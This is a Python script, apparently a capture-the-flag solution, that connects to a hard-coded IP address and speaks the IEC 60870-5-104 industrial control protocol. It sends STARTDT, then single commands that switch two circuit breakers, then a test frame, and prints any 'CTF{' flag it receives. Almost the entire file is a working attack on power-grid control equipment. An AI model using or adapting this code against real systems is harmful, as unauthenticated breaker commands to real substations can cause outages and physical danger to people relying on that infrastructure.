#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

s = socket.socket()
s.settimeout(10)
s.connect((HOST, PORT))
s.send(bytes([0x68,0x04,0x07,0x00,0x00,0x00]))
time.sleep(2)
try:
    r = s.recv(1024)
    print(r.hex())
except:
    pass

# Try breaker 1
asdu = bytes([45, 0x01, 0x06, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01])
s.send(bytes([0x68, len(asdu)+4, 0x00,0x00,0x00,0x00]) + asdu)
time.sleep(1)
# Try breaker 2
asdu = bytes([45, 0x01, 0x06, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x01])
s.send(bytes([0x68, len(asdu)+4, 0x00,0x00,0x00,0x00]) + asdu)
time.sleep(5)
# Send TESTFR
s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
time.sleep(60)
try:
    r = s.recv(8192)
    print(r.hex())
    if b'CTF{' in r:
        print(r)
    while True:
        try:
            s.settimeout(5)
            r2 = s.recv(4096)
            if not r2: break
            print(r2.hex())
            if b'CTF{' in r2:
                print(r2)
                break
        except:
            break
except Exception as e:
    print(e)
s.close()
